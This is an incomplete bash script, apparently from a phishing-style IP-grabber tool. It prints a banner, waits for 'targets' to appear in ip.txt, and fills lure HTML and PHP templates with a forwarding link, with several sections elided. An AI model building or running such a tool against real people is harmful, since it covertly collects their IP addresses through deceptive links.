#!/bin/bash
# Simplified for GET IP
# Powered by emersoncrp
...
printf "\e[1;92m  _____   ______     \e[0m\e[1;77m      _____   _____       _____      \e[0m\n"
printf "\e[1;92m |_   _| |  __  |    \e[0m\e[1;77m     / ____| |  __  \   |  __  |     \e[0m\n"
printf "\e[1;92m   | |   | |__) |   \e[0m\e[1;77m     | |      | |__) |   | |__) |     \e[0m\n" 
printf "\e[1;92m   | |   |  _  /    \e[0m\e[1;77m     | |____  | | \ \    |  _  /      \e[0m\n"
printf "\e[1;92m  _| |_  | |      \e[0m\e[1;77m        \_____| |_|  \_\   |_|         \e[0m\n"  
printf "\e[1;92m |_____| |_|     \e[0m\e[1;77m                                        \e[0m\n" 
...
checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets, \e[0m\e[1;77mPress Ctrl + C to exit...\e[0m\n"
while true; do
if [[ -e "ip.txt" ]]; then
...
sed 's+forwarding_link+'$link'+g' getip.html > index2.html
}

select_template() {
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m GET IP\e[0m\n"
...
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
sed 's+forwarding_link+'$send_link'+g' getip.html > index2.html
fi
rm -rf index3.html
